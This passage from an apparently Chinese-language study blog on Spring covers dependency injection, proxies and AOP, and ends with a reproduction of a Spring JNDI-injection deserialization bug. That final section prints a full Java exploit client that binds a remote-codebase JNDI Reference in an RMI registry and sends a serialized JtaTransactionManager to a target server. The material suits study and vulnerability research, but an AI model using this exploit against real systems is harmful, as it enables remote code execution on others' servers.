<h5 id="构造方法注入"><a href="#构造方法注入" class="headerlink" title="构造方法注入"></a>构造方法注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Message msg;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">(Message msg)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloclass"</span> <span class="attr">class</span>=<span class="string">"com.time.Helloworld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"msg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.test.time"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="集合注入"><a href="#集合注入" class="headerlink" title="集合注入"></a>集合注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.action;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line"><span class="keyword">import</span> java.util.Set;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DI</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Map map;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Set Set;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> List list;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Properties pro;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Map <span class="title">getMap</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMap</span><span class="params">(Map map)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.map = map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Set <span class="title">getSet</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> Set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSet</span><span class="params">(Set set)</span> </span>&#123;  </span><br><span class="line">  Set = set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> List <span class="title">getList</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setList</span><span class="params">(List list)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.list = list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Properties <span class="title">getPro</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> pro;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPro</span><span class="params">(Properties pro)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.pro = pro;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">beans</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//SPRING//DTD BEAN//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.springframework.org/dtd/spring-beans.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"di"</span> <span class="attr">class</span>=<span class="string">"com.sw.action.DI"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- List注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Set注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"set"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Map注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>one<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>two<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>three<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Properties注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>one<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>two<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span>three<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用函数取出内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sw.action.DI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDI</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ApplicationContext actx = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">    <span class="string">"config-di.xml"</span>);</span><br><span class="line">  DI di = (DI) actx.getBean(<span class="string">"di"</span>);</span><br><span class="line">  <span class="comment">// 打印这些集合</span></span><br><span class="line">  System.out.println(di.getList());</span><br><span class="line">  System.out.println(di.getSet());</span><br><span class="line">  System.out.println(di.getMap());</span><br><span class="line">  System.out.println(di.getPro());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-AOP思想"><a href="#Spring-AOP思想" class="headerlink" title="Spring AOP思想"></a>Spring AOP思想</h3><p>在写AOP前先先来写下三种Java中的代理：静态代理，动态代理，CGLIB代理</p>
<ul>
<li>静态代理：<strong>静态代理需要实现目标对象的相同接口，那么可能会导致代理类会非常非常多，维护起来相对麻烦</strong></li>
<li>动态代理：<strong>目标对象一定是要有接口的，没有接口就不能实现动态代理</strong></li>
<li>cglib代理：<strong>为了解决动态代理一定需要接口的问题，通过cglib代理代理的对象不需要接口</strong></li>
</ul>
<h4 id="手动实现AOP编程"><a href="#手动实现AOP编程" class="headerlink" title="手动实现AOP编程"></a>手动实现AOP编程</h4><p>IUser接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AOP类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理工厂</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//维护目标对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//维护关键点代码的类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AOP aop;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProxyInstance</span><span class="params">(Object target_, AOP aop_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标对象和关键点代码的类都是通过外界传递进来</span></span><br><span class="line">        target = target_;</span><br><span class="line">        aop = aop_;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(),</span><br><span class="line">                <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">                        aop.begin();</span><br><span class="line">                        Object returnValue = method.invoke(target, args);</span><br><span class="line">                        aop.close();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> returnValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注解方式实现AOP"><a href="#注解方式实现AOP" class="headerlink" title="注解方式实现AOP"></a>注解方式实现AOP</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"aa"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启aop注解方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>切面类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//指定为切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//里面的值为切入点表达式</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现接口的UserDao类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">implements</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"DB:保存用户"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext ac =</span><br><span class="line">                <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"aa/applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里得到的是代理对象....</span></span><br><span class="line">        IUser iUser = (IUser) ac.getBean(<span class="string">"userDao"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(iUser.getClass());</span><br><span class="line"></span><br><span class="line">        iUser.save();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="通过JNDI注入实现Spring-Framework反序列化"><a href="#通过JNDI注入实现Spring-Framework反序列化" class="headerlink" title="通过JNDI注入实现Spring Framework反序列化"></a>通过JNDI注入实现Spring Framework反序列化</h3><p>漏洞复现项目：</p>
<p><a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
<p>Client端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">      String localAddress= <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">      Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">      ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">      registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">      Socket socket = <span class="keyword">new</span> Socket(localAddress,port);</span><br><span class="line">      System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">      String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line"></span><br><span class="line">      org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">      object.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">      ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">      objectOutputStream.writeObject(object);</span><br><span class="line">      objectOutputStream.flush();</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Server端</p>
